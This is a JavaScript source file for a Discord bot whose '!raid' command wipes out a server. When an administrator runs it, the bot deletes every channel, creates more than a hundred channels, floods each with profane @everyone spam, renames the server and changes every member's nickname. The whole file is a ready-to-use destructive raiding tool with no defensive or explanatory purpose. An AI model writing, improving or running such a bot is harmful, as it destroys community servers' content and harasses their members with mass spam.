const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
	console.log(`Logged In: ${client.user.tag} `)
});

client.on('message', message => {
	if(message.content === '!raid') {
		if(!message.member.hasPermission('ADMINISTRATOR')) return message.channel.send('Necesitas el permiso de Administrador para ejecutar este comando')
	message.guild.channels.cache.forEach(channel => channel.delete());
	
	for (let i = 0; i <= 120; i++) {
	     message.guild.channels.create(`raid-by-${message.author.username}`, {
		     type: 'text'
	     }).then(channel => {
		     channel.send(`This server got fucked by **${message.author.tag}** || @everyone ||`)
		     channel.send(`This server got fucked by **${message.author.tag}** || @everyone ||`)
		     channel.send(`This server got fucked by **${message.author.tag}** || @everyone ||`)
		     channel.send(`This server got fucked by **${message.author.tag}** || @everyone ||`)
		     channel.send(`This server got fucked by **${message.author.tag}** || @everyone ||`)
		     channel.send(`This server got fucked by **${message.author.tag}** || @everyone ||`)
		     channel.send(`This server got fucked by **${message.author.tag}** || @everyone ||`)
		     channel.send(`This server got fucked by **${message.author.tag}** || @everyone ||`)
		     channel.send(`This server got fucked by **${message.author.tag}** || @everyone ||`)
		     channel.send(`This server got fucked by **${message.author.tag}** || @everyone ||`)
	     })

	   }

		message.guild.setName(`${message.author.username}  |  ATACK`)

		message.guild.members.cache.forEach(member => {
			member.setNickname(`RaidBy${message.author.username}`)
		})

	}
});
// Made by FlyZIGT (py#6650)
client.login('TuToken')
